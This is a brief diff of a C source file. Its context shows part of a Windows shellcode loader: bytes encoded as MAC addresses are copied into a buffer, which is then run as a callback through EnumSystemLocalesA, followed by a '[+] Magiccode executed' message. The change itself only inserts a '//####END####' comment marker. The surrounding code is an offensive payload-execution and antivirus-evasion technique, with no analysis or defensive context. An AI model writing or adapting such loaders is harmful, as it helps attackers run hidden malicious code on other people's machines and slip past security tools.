@@ -80,6 +80,10 @@ int main(int argc, char *argv[]) {
         memcpy(hptr + (i * 6), bytes, 6); // Copy 6 bytes for each MAC address
     }
 
+
+    //####END####
+
+    
     // Execute the magiccode
     EnumSystemLocalesA((LOCALE_ENUMPROCA)ha, 0);
     printf("[+] Magiccode executed\n");
